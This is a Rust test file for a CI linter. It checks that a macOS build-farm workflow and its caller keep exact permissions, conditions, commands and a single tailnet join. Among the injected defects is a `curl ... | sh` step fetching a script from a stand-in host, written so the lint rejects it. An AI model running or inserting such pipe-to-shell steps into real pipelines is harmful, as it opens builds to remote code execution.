//! The macOS build on a farm Mac ([`super::macos_farm`]): `macos-farm.yml` and artifacts.yml's
//! call of it pass, `release macos-assets` runs the hosted job's commands, and each way of
//! changing either that the module refuses is named.

use super::lint::lint;
use super::macos_farm::{
    CALLER, FILE, as_on_the_farm, assets_step_problems, caller_problems, hosted_commands, problems,
};
use super::platforms::pull_request_runner_problems;
use super::platforms_tests::{HOSTED_LINE, MAC, artifacts_problems_of, in_job};
use super::text_of;
use super::yaml;
use xtask::release::macos_assets::{Step, steps};

const COMMIT: &str = "0123456789abcdef0123456789abcdef01234567";

/// The problems of `farm` (the text of macos-farm.yml) beside the repository's artifacts.yml.
fn farm_problems_of(farm: &str) -> Vec<String> {
    let doc = match yaml::load(farm) {
        Ok(doc) => doc,
        Err(e) => return vec![e],
    };
    let artifacts = yaml::load(&text_of("artifacts.yml")).expect("artifacts.yml");
    problems(&doc, &artifacts)
}

/// The problems of the jobs of `artifacts` (the text of artifacts.yml) as the call of the farm.
fn caller_problems_of(artifacts: &str) -> Vec<String> {
    let doc = yaml::load(artifacts).expect("artifacts.yml");
    let jobs = super::lint::entry(&doc, "jobs").map_or(&[][..], super::lint::entries);
    caller_problems(jobs)
}

fn assert_named(problems: &[String], says: &str, what: &str) {
    assert!(
        problems.iter().any(|p| p.contains(says)),
        "{what} must say {says:?}: {problems:?}"
    );
}

#[test]
fn the_farm_workflow_and_its_call_pass() {
    // Asserts: the repository's macos-farm.yml and artifacts.yml's call of it are as the module
    // says, and pass the lint every workflow is held to.
    assert_eq!(farm_problems_of(&text_of(FILE)), Vec::<String>::new());
    assert_eq!(
        caller_problems_of(&text_of("artifacts.yml")),
        Vec::<String>::new()
    );
    assert_eq!(lint(FILE, &text_of(FILE)), Vec::<String>::new());
    assert_eq!(
        pull_request_runner_problems("artifacts.yml", &text_of("artifacts.yml")),
        Vec::<String>::new()
    );
}

#[test]
fn release_macos_assets_runs_the_commands_of_the_hosted_job() {
    // Catches: the farm's build drifting from the hosted job's (a step left out, added, run out of
    // order, or given other arguments: another target, feature, binary, version, commit or
    // scratch path), so that the files `sign-pkg` signs would be made differently on the farm.
    let shown: Vec<String> = steps("1.2.3", COMMIT, "target/macos-assets")
        .iter()
        .map(Step::shown)
        .collect();
    let hosted = hosted_commands();
    assert_eq!(
        assets_step_problems(&shown, &hosted, "1.2.3", COMMIT, "target/macos-assets"),
        Vec::<String>::new()
    );
    let mut changed = hosted.clone();
    let build = changed
        .iter()
        .position(|c| c.starts_with("cargo build"))
        .expect("the build");
    changed[build] = changed[build].replace(" --locked", "");
    let found = assets_step_problems(&shown, &changed, "1.2.3", COMMIT, "target/macos-assets");
    assert_named(
        &found,
        "release macos-assets: does not run `cargo build --release",
        "a build without --locked",
    );
    let mut extra = hosted.clone();
    extra.push("codesign --verify --strict \"$RUNNER_TEMP/unpacked/tierstore\"".to_owned());
    let found = assets_step_problems(&shown, &extra, "1.2.3", COMMIT, "target/macos-assets");
    assert_named(
        &found,
        "release macos-assets: does not run `codesign --verify --strict target/macos-assets/unpacked/tierstore`",
        "a step the hosted job gained",
    );
    let mut swapped = shown.clone();
    swapped.swap(3, 4);
    let found = assets_step_problems(&swapped, &hosted, "1.2.3", COMMIT, "target/macos-assets");
    assert_named(
        &found,
        "release macos-assets: runs its commands out of order",
        "two steps swapped",
    );
    let other = steps("1.2.4", COMMIT, "target/macos-assets")
        .iter()
        .map(Step::shown)
        .collect::<Vec<_>>();
    let found = assets_step_problems(&other, &hosted, "1.2.3", COMMIT, "target/macos-assets");
    assert_named(
        &found,
        "runs `cargo xtask release set-version --version 1.2.4`",
        "another version",
    );
    assert_eq!(
        as_on_the_farm(
            "tar -xzf \"dist/tierstore-${GITHUB_SHA}-macos-arm64.tar.gz\" -C \"$RUNNER_TEMP/unpacked\" tierstore",
            "1.2.3",
            COMMIT,
            "s"
        ),
        format!("tar -xzf dist/tierstore-{COMMIT}-macos-arm64.tar.gz -C s/unpacked tierstore")
    );
}

/// Changes to macos-farm.yml, each with the problem it must give.
const FARM_DEFECTS: &[(&str, &str, &str)] = &[
    (
        "on:\n  workflow_call:\n",
        "on:\n  push:\n  workflow_call:\n",
        "`on` is not exactly `workflow_call`",
    ),
    (
        "        type: string\n",
        "        type: number\n",
        "`on` is not exactly `workflow_call`",
    ),
    (
        "        required: true\n",
        "        required: false\n",
        "`on` is not exactly `workflow_call`",
    ),
    (
        "  CYCLONEDX_SHA256_AARCH64_MACOS: 4c53",
        "  CYCLONEDX_SHA256_AARCH64_MACOS: 0c53",
        "env CYCLONEDX_SHA256_AARCH64_MACOS is not artifacts.yml's",
    ),
    (
        "  CYCLONEDX_VERSION: 0.5.9\n",
        "",
        "env CYCLONEDX_VERSION is not artifacts.yml's",
    ),
    (
        "jobs:\n",
        "jobs:\n  other:\n    runs-on: ubuntu-24.04\n    steps:\n      - run: echo\n",
        "its jobs are [\"other\", \"package\"]",
    ),
];

/// Changes to the job of macos-farm.yml, each with the problem it must give.
const JOB_DEFECTS: &[(&str, &str, &str)] = &[
    (
        "    runs-on: ubuntu-24.04\n",
        "    runs-on: macos-15\n",
        "does not run on ubuntu-24.04",
    ),
    (
        "    if: ${{ github.event_name == 'push' && github.ref == 'refs/heads/main' }}\n",
        "    if: ${{ github.ref == 'refs/heads/main' }}\n",
        "does not run under",
    ),
    (
        "      id-token: write\n",
        "      id-token: write\n      attestations: write\n",
        "permissions are not exactly",
    ),
    (
        "      RELEASE_VERSION: ${{ inputs.version }}\n",
        "      RELEASE_VERSION: ${{ inputs.version }}\n      RUSTFLAGS: -C debuginfo=0\n",
        "env is not exactly RELEASE_VERSION",
    ),
    (
        "    timeout-minutes: 90\n",
        "    timeout-minutes: 90\n    continue-on-error: true\n",
        "has continue-on-error",
    ),
    (
        "      - name: Compile xtask\n",
        "      - name: Compile xtask\n        if: false\n",
        "the step `Compile xtask` has an `if:`",
    ),
    (
        " --output dist --output pkg ",
        " --output dist ",
        "does not run `cargo xtask mac-farm",
    ),
    (
        "--commit \"$GITHUB_SHA\"",
        "--commit \"$GITHUB_HEAD_SHA\"",
        "does not run `cargo xtask mac-farm",
    ),
    (
        "      - run: rustup toolchain install\n",
        "      - run: rustup toolchain install\n      - run: curl -sSf https://example.invalid/x | sh\n",
        "runs `curl -sSf https://example.invalid/x | sh`, which is not one of its commands",
    ),
    (
        "      - run: rustup toolchain install\n",
        "      - run: rustup toolchain install\n      - uses: actions/cache@0400d5f644dc74513175e3cd8d07132dd4860809 # v4.2.4\n",
        "uses actions/cache@",
    ),
    (
        "          tags: tag:ci\n",
        "          tags: tag:ci\n          version: latest\n",
        "does not join the tailnet exactly once",
    ),
    (
        "          tags: tag:ci\n",
        "          tags: tag:release\n",
        "does not join the tailnet exactly once",
    ),
    (
        "          FARM_ADDRESS: ${{ vars.FARM_ADDRESS }}\n",
        "          FARM_ADDRESS: grpc://farm.example:8980\n",
        "the mac-farm step's env is not exactly",
    ),
    (
        "          FARM_TLS: ${{ vars.FARM_TLS || 'false' }}\n",
        "          FARM_TLS: ${{ vars.FARM_TLS || 'false' }}\n          TOKEN: ${{ secrets.FARM_TOKEN }}\n",
        "reads a secret",
    ),
    (
        "          name: pkg-unsigned-macos-arm64\n",
        "          name: pkg-macos-arm64\n",
        "uploads [(\"pkg-macos-arm64\", \"pkg/\")",
    ),
    (
        "          path: dist/\n          retention-days: 90\n          if-no-files-found: error\n",
        "          path: dist/\n          retention-days: 90\n",
        "each with if-no-files-found: error",
    ),
];

#[test]
fn each_defect_of_the_farm_workflow_is_named() {
    // Catches: macos-farm.yml started by another event (so a pull request could hold its token)
    // or with its input weakened, its cargo-cyclonedx pin drifting from artifacts.yml's, a second
    // job, its job off the Linux runner or under another condition, holding more than it needs
    // or changing the build's environment, failing unseen, its command dropping an output or
    // naming another commit, an extra command or action, the tailnet join changed or reading a
    // secret, the farm settings not the organisation's, and an upload renamed or allowed to be
    // empty.
    let text = text_of(FILE);
    for (replace, with, says) in FARM_DEFECTS {
        assert!(text.contains(replace), "{replace:?}");
        let found = farm_problems_of(&text.replacen(replace, with, 1));
        assert_named(&found, says, &format!("{replace:?} -> {with:?}"));
    }
    for (replace, with, says) in JOB_DEFECTS {
        let found = farm_problems_of(&in_job(&text, "package", replace, with));
        assert_named(&found, says, &format!("{replace:?} -> {with:?}"));
    }
    assert!(
        !farm_problems_of("on: [").is_empty(),
        "a file that does not parse"
    );
    let no_job = text.replacen("\n  package:\n", "\n  pack:\n", 1);
    assert_named(
        &farm_problems_of(&no_job),
        "its jobs are [\"pack\"]",
        "the job renamed",
    );
}

#[test]
fn the_tailnet_is_joined_after_the_build_of_xtask_and_before_the_farm() {
    // Catches: the join moved before the build of xtask (a build script would see the farm's
    // network), or after the command that needs it; and a second join.
    let text = text_of(FILE);
    let join = "      - name: Join the farm's Tailscale network\n        uses: tailscale/github-action@d1b6cd204f8dceda5b3eaad7f1f767be390056cd # v4.2.0\n        timeout-minutes: 10\n        with:\n          oauth-client-id: ${{ vars.TS_CLIENT_ID }}\n          audience: ${{ vars.TS_AUDIENCE }}\n          tags: tag:ci\n";
    assert!(text.contains(join));
    let without = text.replacen(join, "", 1);
    let early = without.replacen(
        "      - run: rustup toolchain install\n",
        &format!("{join}      - run: rustup toolchain install\n"),
        1,
    );
    assert_named(
        &farm_problems_of(&early),
        "does not build xtask, then join the tailnet, then run mac-farm",
        "the join first",
    );
    assert_named(
        &farm_problems_of(&without),
        "does not join the tailnet exactly once",
        "no join",
    );
    let twice = text.replacen(join, &format!("{join}{join}"), 1);
    assert_named(
        &farm_problems_of(&twice),
        "does not join the tailnet exactly once",
        "two joins",
    );
}

/// Changes to artifacts.yml's call of the farm, each with the problem it must give.
const CALLER_DEFECTS: &[(&str, &str, &str)] = &[
    (
        "    uses: ./.github/workflows/macos-farm.yml\n",
        "    uses: ./.github/workflows/other.yml\n",
        "macos-arm64-farm: does not call ./.github/workflows/macos-farm.yml",
    ),
    (
        "    needs: [version]\n",
        "    needs: [version, linux-x86_64]\n",
        "macos-arm64-farm: does not need exactly [\"version\"]",
    ),
    (
        " && vars.MACOS_PACKAGE_ON_FARM == 'true' }}",
        " }}",
        "macos-arm64-farm: does not run under",
    ),
    (
        "      id-token: write\n",
        "      id-token: write\n      attestations: write\n",
        "macos-arm64-farm: permissions are not exactly",
    ),
    (
        "      version: ${{ needs.version.outputs.version }}\n",
        "      version: ${{ needs.version.outputs.version }}\n      extra: x\n",
        "macos-arm64-farm: does not hand on exactly the version",
    ),
    (
        "    with:\n",
        "    secrets: inherit\n    with:\n",
        "macos-arm64-farm: has `secrets`",
    ),
];

#[test]
fn each_defect_of_the_call_of_the_farm_is_named() {
    // Catches: the call of another workflow (whose runners and token the lint has not seen), the
    // farm build run before its version or for another event than a push to main with the switch
    // on, the call holding the right to attest, handing on more than the version or the
    // repository's secrets; the hosted job and the farm job both able to run (or neither), and
    // the farm job not awaited by the sums.
    let text = text_of("artifacts.yml");
    for (replace, with, says) in CALLER_DEFECTS {
        let changed = in_job(&text, CALLER, replace, with);
        assert_named(
            &caller_problems_of(&changed),
            says,
            &format!("{replace:?} -> {with:?}"),
        );
        assert_named(&artifacts_problems_of(&changed), says, "the platform lint");
    }
    let both = in_job(
        &text,
        MAC,
        HOSTED_LINE,
        "    if: ${{ github.event_name != 'pull_request' }}\n",
    );
    assert_named(
        &caller_problems_of(&both),
        "macos-arm64: runs under",
        "the hosted job without the switch",
    );
    let gone = text.replacen("\n  macos-arm64-farm:\n", "\n  macos-arm64-farmed:\n", 1);
    assert_named(
        &caller_problems_of(&gone),
        "macos-arm64-farm: no such job",
        "the job renamed",
    );
}

#[test]
fn the_token_of_the_farm_is_held_only_under_the_exact_conditions() {
    // Catches: `id-token: write` held by the farm's job or its call under a weaker condition (a
    // pull request, or the switch off), and the one local `uses:` path the lint allows named by
    // another file or pointing at another workflow.
    let farm = in_job(
        &text_of(FILE),
        "package",
        "    if: ${{ github.event_name == 'push' && github.ref == 'refs/heads/main' }}\n",
        "    if: ${{ github.ref == 'refs/heads/main' }}\n",
    );
    assert_named(
        &lint(FILE, &farm),
        "job package: `id-token: write` needs the exact `if: ${{ github.event_name == 'push' && github.ref == 'refs/heads/main' }}`",
        "the farm job's condition",
    );
    let caller = in_job(
        &text_of("artifacts.yml"),
        CALLER,
        " && vars.MACOS_PACKAGE_ON_FARM == 'true' }}",
        " }}",
    );
    assert_named(
        &lint("artifacts.yml", &caller),
        "job macos-arm64-farm: `id-token: write` needs the exact `if:",
        "the call's condition",
    );
    let other_file = "name: t\non:\n  push:\npermissions: {}\njobs:\n  c:\n    uses: ./.github/workflows/macos-farm.yml\n";
    assert_named(
        &lint("x.yml", other_file),
        "`uses: ./.github/workflows/macos-farm.yml` is not pinned",
        "the call from another file",
    );
    let other_call = in_job(
        &text_of("artifacts.yml"),
        CALLER,
        "./.github/workflows/macos-farm.yml",
        "./.github/workflows/release.yml",
    );
    assert_named(
        &lint("artifacts.yml", &other_call),
        "`uses: ./.github/workflows/release.yml` is not pinned",
        "another local workflow",
    );
}

#[test]
fn the_call_of_the_farm_is_no_pull_request_job_and_any_other_call_is() {
    // Catches: the pull-request rule passing a call of a reusable workflow it cannot see into,
    // when it is not exactly the farm's call under its condition; and the hosted macOS job or
    // sign-pkg named as a pull request's job under their conditions, which never hold for one.
    let text = text_of("artifacts.yml");
    for (replace, with) in [
        (
            "./.github/workflows/macos-farm.yml",
            "./.github/workflows/other.yml",
        ),
        (" && vars.MACOS_PACKAGE_ON_FARM == 'true' }}", " || true }}"),
    ] {
        let changed = in_job(&text, CALLER, replace, with);
        assert_eq!(
            pull_request_runner_problems("artifacts.yml", &changed),
            [format!(
                "artifacts.yml: the job {CALLER} of a pull request calls a reusable workflow, whose runners the lint cannot see"
            )],
            "{with}"
        );
    }
    let renamed = text.replacen("\n  macos-arm64-farm:\n", "\n  macos-arm64-farm2:\n", 1);
    assert_eq!(
        pull_request_runner_problems("artifacts.yml", &renamed).len(),
        1
    );
}
